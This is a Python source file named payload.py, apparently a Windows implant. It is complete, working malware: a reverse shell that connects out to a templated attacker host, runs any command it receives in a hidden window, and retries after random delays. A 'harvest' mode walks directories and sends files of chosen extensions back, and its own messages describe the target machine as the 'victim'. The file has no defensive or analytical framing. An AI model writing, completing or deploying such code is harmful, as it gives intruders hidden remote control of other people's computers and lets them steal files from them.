# payload.py
# The Heartbeat Soul, now a perfect mimic.

import os
import sys
import time
import random
import socket
import subprocess
import hashlib
import json
from threading import Thread

# --- DYNAMIC CONFIG ---
RHOST = "##RHOST##"
RPORT = ##RPORT##

# --- CONSTANTS FOR THE HARVEST PROTOCOL ---
CHUNK_SIZE = 4096
HEADER_SIZE = 10
PROMPT_DELIMITER = b"<|SOPHIACWD|>"

# (Functions calculate_hash, send_file, and harvest_files remain unchanged from the previous version)
def calculate_hash(file_path):
    """Calculates the SHA256 hash of a file."""
    sha256_hash = hashlib.sha256()
    try:
        with open(file_path, "rb") as f:
            for byte_block in iter(lambda: f.read(4096), b""):
                sha256_hash.update(byte_block)
        return sha256_hash.hexdigest()
    except (IOError, OSError):
        return None

def send_file(s_obj, file_path, base_dir):
    """Sends a single file with metadata and content."""
    try:
        file_size = os.path.getsize(file_path)
        file_hash = calculate_hash(file_path)
        if file_hash is None:
            return False

        relative_path = os.path.relpath(file_path, base_dir)

        metadata = {
            "type": "file_start",
            "path": relative_path.replace('\\', '/'),
            "size": file_size,
            "hash": file_hash
        }
        
        metadata_json = json.dumps(metadata).encode('utf-8')
        metadata_header = f"{len(metadata_json):<{HEADER_SIZE}}".encode('utf-8')
        s_obj.sendall(metadata_header + metadata_json)

        with open(file_path, 'rb') as f:
            while True:
                chunk = f.read(CHUNK_SIZE)
                if not chunk:
                    break
                s_obj.sendall(chunk)
        
        ack = s_obj.recv(3).decode('utf-8')
        return ack == 'ACK'
    except Exception:
        return False

def harvest_files(s_obj, command_parts):
    """Finds and sends files based on extensions."""
    if len(command_parts) < 3:
        error_msg = {"type": "error", "message": "Invalid harvest command. Usage: harvest <path> <ext1> <ext2> ..."}
        error_json = json.dumps(error_msg).encode('utf-8')
        error_header = f"{len(error_json):<{HEADER_SIZE}}".encode('utf-8')
        s_obj.sendall(error_header + error_json)
        return
        
    search_path = command_parts[1]
    extensions = [ext.lower() if ext.startswith('.') else '.' + ext.lower() for ext in command_parts[2:]]

    if not os.path.isdir(search_path):
        error_msg = {"type": "error", "message": f"Directory not found: {search_path}"}
        error_json = json.dumps(error_msg).encode('utf-8')
        error_header = f"{len(error_json):<{HEADER_SIZE}}".encode('utf-8')
        s_obj.sendall(error_header + error_json)
    else:
        for root, _, files in os.walk(search_path):
            for filename in files:
                if any(filename.lower().endswith(ext) for ext in extensions):
                    file_path = os.path.join(root, filename)
                    send_file(s_obj, file_path, search_path)
    
    completion_msg = {"type": "harvest_end", "message": "Harvest process completed on victim side."}
    completion_json = json.dumps(completion_msg).encode('utf-8')
    completion_header = f"{len(completion_json):<{HEADER_SIZE}}".encode('utf-8')
    s_obj.sendall(completion_header + completion_json)


def run_conduit():
    """The main reverse shell and harvesting loop with a stateful, mirrored prompt."""
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s_obj:
                s_obj.connect((RHOST, RPORT))

                while True: # Main command loop
                    # Signal readiness by sending the current working directory as the prompt
                    s_obj.sendall(os.getcwd().encode('utf-8') + PROMPT_DELIMITER)
                    
                    command_raw = s_obj.recv(2048).decode('utf-8', errors='ignore').strip()
                    if not command_raw:
                        break # Connection closed

                    command_parts = command_raw.split()
                    if not command_parts:
                        continue

                    cmd = command_parts[0].lower()
                    
                    output = b''
                    try:
                        if cmd == 'harvest':
                             # Harvest mode is special, it has its own communication protocol
                            harvest_files(s_obj, command_parts)
                            continue # Skip normal output sending
                        elif cmd == 'cd':
                            if len(command_parts) > 1:
                                path = command_raw[3:].strip() # Get the full path
                                os.chdir(path)
                            else: # 'cd' with no arguments
                                output = os.getcwd().encode('utf-8') + b'\n'
                        elif len(cmd) == 2 and cmd[1] == ':' and len(command_parts) == 1: # Drive change like D:
                            os.chdir(cmd)
                        elif cmd in ['quit', 'exit']:
                            break
                        else:
                            # Original cmd.exe functionality, now running in the correct directory
                            CREATE_NO_WINDOW = 0x08000000
                            proc = subprocess.Popen(command_raw, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW, cwd=os.getcwd())
                            stdout_value, stderr_value = proc.communicate()
                            output = stdout_value + stderr_value
                    except Exception as e:
                        output = str(e).encode('utf-8')

                    s_obj.sendall(output)

        except Exception:
            time.sleep(random.randint(30, 60))
            continue

if __name__ == "__main__":
    run_conduit()